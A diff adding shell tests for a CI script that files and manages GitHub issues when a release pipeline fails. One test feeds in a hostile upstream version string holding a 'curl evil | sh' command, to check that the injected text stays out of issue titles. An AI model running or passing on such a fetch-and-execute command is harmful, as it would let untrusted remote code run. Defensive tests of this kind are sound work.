@@ -81,3 +81,89 @@ open_issue() {
     run grep 'issue create' "$STUB_LOG"
     assert_output --partial "Release blocked: ocx unknown"
 }
+
+@test "a hostile upstream version never reaches the issue title" {
+    open_issue ""
+    stub curl 'echo "{\"latest\":{\"version\":\"@ocx-sh/maintainers please run curl evil | sh\"}}"'
+    OCX_VERSION='' NEEDS_JSON="$FAIL" run_tool "$REPORT"
+    run grep 'issue create' "$STUB_LOG"
+    assert_output --partial "Release blocked: ocx unknown"
+    refute_output --partial "maintainers"
+}
+
+@test "the issue text no longer claims that nothing is published or that the next run retries by itself" {
+    open_issue ""
+    NEEDS_JSON="$FAIL" run_tool "$REPORT"
+    run cat "$STUB_LOG"
+    refute_output --partial "Nothing is published while"
+    refute_output --partial "retries on its own"
+    assert_output --partial "publish_current=true"
+}
+
+# prev_run <conclusion of the detect job of the previous completed run>
+prev_run() {
+    stub gh "case \"\$*\" in
+*'issue list'*) echo '' ;;
+*'run list'*) echo 99 ;;
+*'run view'*) echo '$1' ;;
+esac"
+}
+DETECT_FAIL='{"detect":{"result":"failure"},"prepare":{"result":"skipped"}}'
+
+@test "a first scheduled detect failure is not reported" {
+    prev_run success
+    EVENT_NAME=schedule NEEDS_JSON="$DETECT_FAIL" run_tool "$REPORT"
+    assert_success
+    run grep 'issue create' "$STUB_LOG"
+    assert_failure
+}
+
+@test "a second scheduled detect failure in a row is reported" {
+    prev_run failure
+    EVENT_NAME=schedule NEEDS_JSON="$DETECT_FAIL" run_tool "$REPORT"
+    assert_success
+    run grep 'issue create' "$STUB_LOG"
+    assert_success
+}
+
+@test "a detect failure on a manual dispatch is reported at once" {
+    prev_run success
+    EVENT_NAME=workflow_dispatch NEEDS_JSON="$DETECT_FAIL" run_tool "$REPORT"
+    run grep 'issue create' "$STUB_LOG"
+    assert_success
+}
+
+@test "a second failure on the same day adds no comment" {
+    stub gh "case \"\$*\" in
+*'issue list'*) echo 12 ;;
+*'issue view'*) date -u +%Y-%m-%d ;;
+esac"
+    NEEDS_JSON="$FAIL" run_tool "$REPORT"
+    assert_success
+    run grep 'issue comment' "$STUB_LOG"
+    assert_failure
+}
+
+@test "a failure when the last update is from an earlier day comments" {
+    stub gh "case \"\$*\" in
+*'issue list'*) echo 12 ;;
+*'issue view'*) echo 2020-01-01 ;;
+esac"
+    NEEDS_JSON="$FAIL" run_tool "$REPORT"
+    run grep 'issue comment 12' "$STUB_LOG"
+    assert_success
+}
+
+@test "a run with nothing to do and the version published closes a stale issue" {
+    open_issue 12
+    NEEDS_JSON='{"detect":{"result":"success","outputs":{"run":"false","published":"true"}},"prepare":{"result":"skipped"}}' run_tool "$REPORT"
+    run grep 'issue close 12' "$STUB_LOG"
+    assert_success
+}
+
+@test "a run with nothing to do and the version unpublished leaves the issue" {
+    open_issue 12
+    NEEDS_JSON='{"detect":{"result":"success","outputs":{"run":"false","published":"false"}},"prepare":{"result":"skipped"}}' run_tool "$REPORT"
+    run grep 'issue close' "$STUB_LOG"
+    assert_failure
+}
